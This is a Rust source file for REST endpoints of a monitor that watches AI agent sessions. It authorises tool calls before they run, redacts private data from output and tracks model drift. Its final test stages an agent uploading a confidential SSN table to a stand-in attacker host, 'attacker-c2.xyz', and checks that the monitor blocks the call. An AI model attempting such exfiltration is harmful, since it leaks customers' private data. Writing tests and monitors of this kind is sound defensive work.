//! REST API endpoints for 5-Layer OpenTelemetry GenAI Behavioral and Session Monitor (`M7B`).
//!
//! Exposes:
//! - `GET /api/v1/telemetry/genai-monitor` (and `/api/telemetry/genai-monitor`)
//! - `POST /api/v1/telemetry/genai-monitor/evaluate` (and `/api/telemetry/genai-monitor/evaluate`)

use axum::{
    extract::Json,
    routing::{get, post},
    Router,
};
use once_cell::sync::Lazy;
use osoosi_telemetry::{
    ActingServiceIdentity, ApprovalOutcome, CapabilityLevel, CorrelatedNetworkSocket,
    GenAiBehavioralMonitor, GenAiIdentityContext, PendingToolExecution, PreExecutionVerdict,
    SensitivityTier,
};
use osoosi_types::ProcessInstanceKey;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::HashSet;
use std::sync::Arc;

use crate::DashboardState;

/// Global singleton instance of the 5-Layer OpenTelemetry GenAI Behavioral Monitor.
static GLOBAL_GENAI_MONITOR: Lazy<Arc<GenAiBehavioralMonitor>> =
    Lazy::new(|| Arc::new(GenAiBehavioralMonitor::default()));

/// Returns a clone of the global GenAI monitor handle.
pub fn get_global_genai_monitor() -> Arc<GenAiBehavioralMonitor> {
    GLOBAL_GENAI_MONITOR.clone()
}

/// Mounts GenAI telemetry monitor routes onto the dashboard router.
pub fn routes() -> Router<DashboardState> {
    Router::new()
        .route(
            "/api/v1/telemetry/genai-monitor",
            get(get_genai_monitor_status),
        )
        .route(
            "/api/telemetry/genai-monitor",
            get(get_genai_monitor_status),
        )
        .route(
            "/api/v1/telemetry/genai-monitor/evaluate",
            post(post_genai_monitor_evaluate),
        )
        .route(
            "/api/telemetry/genai-monitor/evaluate",
            post(post_genai_monitor_evaluate),
        )
}

/// Handler for `GET /api/v1/telemetry/genai-monitor`.
pub async fn get_genai_monitor_status() -> Json<Value> {
    let monitor = get_global_genai_monitor();
    let status = monitor.get_status();
    let cohorts = monitor.drift_monitor.get_cohort_stats();
    let alerts = monitor.drift_monitor.get_alerts();

    Json(json!({
        "ok": true,
        "status": "success",
        "monitor_status": status,
        "cohorts": cohorts,
        "drift_alerts": alerts,
        "record_raw_content_default": status.record_raw_content_default,
    }))
}

/// Payload input for evaluating contextual retrieved documents.
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct RetrievedDocInput {
    pub uri: String,
    pub content: String,
    pub sensitivity: Option<SensitivityTier>,
}

/// Request payload for `POST /api/v1/telemetry/genai-monitor/evaluate`.
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct GenAiEvaluateRequest {
    pub session_id: String,
    pub user_id: Option<String>,
    pub agent_id: Option<String>,
    pub model: Option<String>,
    pub prompt_version: Option<String>,
    pub system: Option<String>,
    pub operation_name: Option<String>,
    pub capabilities: Option<Vec<CapabilityLevel>>,
    pub approval_outcome: Option<ApprovalOutcome>,
    pub correlated_process: Option<ProcessInstanceKey>,
    pub correlated_network: Option<CorrelatedNetworkSocket>,
    pub retrieved_document: Option<RetrievedDocInput>,
    pub pending_tool: Option<PendingToolExecution>,
    pub raw_output: Option<String>,
    pub latency_ms: Option<u64>,
}

/// Handler for `POST /api/v1/telemetry/genai-monitor/evaluate`.
pub async fn post_genai_monitor_evaluate(
    Json(payload): Json<GenAiEvaluateRequest>,
) -> Json<Value> {
    let monitor = get_global_genai_monitor();
    let session_id = payload.session_id.trim();
    if session_id.is_empty() {
        return Json(json!({
            "ok": false,
            "error": "session_id must not be empty",
            "error_code": "INVALID_SESSION_ID"
        }));
    }

    // 1. Ensure session is registered with identity
    let proc_key = payload
        .correlated_process
        .unwrap_or_else(|| ProcessInstanceKey::new(1, 1000));

    if monitor.get_session(session_id).is_none() {
        let mut caps = HashSet::new();
        if let Some(user_caps) = payload.capabilities {
            for c in user_caps {
                caps.insert(c);
            }
        } else {
            caps.insert(CapabilityLevel::L1ReadOnlySandbox);
            caps.insert(CapabilityLevel::L2LocalWorkspaceFs);
            caps.insert(CapabilityLevel::L3LoopbackIntranet);
            caps.insert(CapabilityLevel::L4OutboundInternetAllowlisted);
        }

        let identity = GenAiIdentityContext {
            initiating_user_id: payload
                .user_id
                .unwrap_or_else(|| "operator@corp.internal".to_string()),
            agent_id: payload
                .agent_id
                .unwrap_or_else(|| "agent_generic_assistant".to_string()),
            acting_service_identity: ActingServiceIdentity {
                process_key: proc_key,
                binary_sha256: [0xaa; 32],
                script_sha256: None,
                service_name: "osoosi_agent".to_string(),
            },
            granted_capabilities: caps,
            approval_outcome: payload.approval_outcome.unwrap_or_default(),
        };

        monitor.start_session(session_id, identity);
    }

    // 2. Ingest contextual document retrieval if present
    let mut ingested_doc_digest = None;
    if let Some(doc) = payload.retrieved_document {
        let digest = monitor.record_document_retrieval(
            session_id,
            &doc.uri,
            doc.content.as_bytes(),
            doc.sensitivity.unwrap_or(SensitivityTier::Internal),
        );
        ingested_doc_digest = Some(hex::encode(digest));
    }

    // 3. Pre-execution authorization for pending tool
    let mut tool_verdict = None;
    if let Some(ref tool) = payload.pending_tool {
        let verdict = monitor.evaluate_tool_pre_execution(session_id, tool);
        tool_verdict = Some(verdict);
    }

    // 4. Privacy-preserving output scrubbing and evaluation
    let mut privacy_report = None;
    if let Some(ref raw_output) = payload.raw_output {
        let report = monitor.evaluate_and_scrub_output(session_id, raw_output);
        privacy_report = Some(report);
    }

    // 5. Layer 5 model call and drift monitoring
    let mut drift_alert = None;
    if let (Some(ref model_id), Some(ref p_ver)) = (&payload.model, &payload.prompt_version) {
        let success = match &tool_verdict {
            Some(PreExecutionVerdict::Allowed) | None => true,
            Some(PreExecutionVerdict::Blocked { .. }) => false,
        };
        let violation_rule = match &tool_verdict {
            Some(PreExecutionVerdict::Blocked { rule_name, .. }) => Some(rule_name.as_str()),
            _ => None,
        };
        let factual = privacy_report
            .as_ref()
            .map(|r| r.factual_support_score)
            .unwrap_or(1.0);
        let compliance = privacy_report
            .as_ref()
            .map(|r| r.instruction_compliance_score)
            .unwrap_or(1.0);
        let tool_name = payload.pending_tool.as_ref().map(|t| t.tool_name.as_str());

        drift_alert = monitor.record_model_call_metrics(
            model_id,
            p_ver,
            payload.latency_ms.unwrap_or(50),
            success,
            factual,
            compliance,
            tool_name,
            violation_rule,
        );
    }

    Json(json!({
        "ok": true,
        "session_id": session_id,
        "ingested_document_digest": ingested_doc_digest,
        "tool_verdict": tool_verdict,
        "privacy_evaluation": privacy_report,
        "drift_alert": drift_alert,
        "monitor_status": monitor.get_status(),
    }))
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::body::Body;
    use axum::http::{Request, StatusCode};
    use tower::ServiceExt;

    #[tokio::test]
    async fn test_rest_genai_monitor_status_endpoint() {
        let app = routes().with_state(DashboardState::new(None, None));

        let request = Request::builder()
            .uri("/api/v1/telemetry/genai-monitor")
            .method("GET")
            .body(Body::empty())
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), StatusCode::OK);

        let body_bytes = axum::body::to_bytes(response.into_body(), 1024 * 64)
            .await
            .unwrap();
        let json_val: Value = serde_json::from_slice(&body_bytes).unwrap();
        assert_eq!(json_val["ok"], true);
        assert_eq!(json_val["status"], "success");
        assert_eq!(json_val["monitor_status"]["status"], "active");
        assert_eq!(json_val["record_raw_content_default"], false);
    }

    #[tokio::test]
    async fn test_rest_genai_monitor_evaluate_taint_to_egress() {
        let app = routes().with_state(DashboardState::new(None, None));

        let payload = json!({
            "session_id": "rest_session_taint_01",
            "user_id": "bob@corp.internal",
            "agent_id": "agent_data_analyst",
            "model": "gpt-4o",
            "prompt_version": "v1.0",
            "retrieved_document": {
                "uri": "db://confidential/customer_ssn_table",
                "content": "CONFIDENTIAL CUSTOMER RECORDS",
                "sensitivity": "Confidential"
            },
            "pending_tool": {
                "tool_name": "upload_file_to_cloud",
                "tool_call_id": "call_upload_unapproved",
                "arguments_json": {"dest": "attacker-c2.xyz"},
                "destination_host": "attacker-c2.xyz",
                "destination_port": 443,
                "required_capability": "L4OutboundInternetAllowlisted",
                "is_egress_upload": true
            },
            "raw_output": "Exfiltrating customer ssn 999-00-1111 to attacker"
        });

        let request = Request::builder()
            .uri("/api/v1/telemetry/genai-monitor/evaluate")
            .method("POST")
            .header("Content-Type", "application/json")
            .body(Body::from(serde_json::to_vec(&payload).unwrap()))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), StatusCode::OK);

        let body_bytes = axum::body::to_bytes(response.into_body(), 1024 * 64)
            .await
            .unwrap();
        let json_val: Value = serde_json::from_slice(&body_bytes).unwrap();
        assert_eq!(json_val["ok"], true);

        // Tool verdict must be Blocked under InternalDocToUnapprovedUpload
        let verdict = &json_val["tool_verdict"];
        assert!(verdict.get("Blocked").is_some());
        assert_eq!(
            verdict["Blocked"]["rule_name"],
            "InternalDocToUnapprovedUpload"
        );

        // Privacy evaluation must redact SSN with record_raw_content = false
        let priv_eval = &json_val["privacy_evaluation"];
        assert_eq!(priv_eval["record_raw_content"], false);
        assert!(priv_eval["scrubbed_preview"]
            .as_str()
            .unwrap()
            .contains("[REDACTED_SSN]"));
    }
}
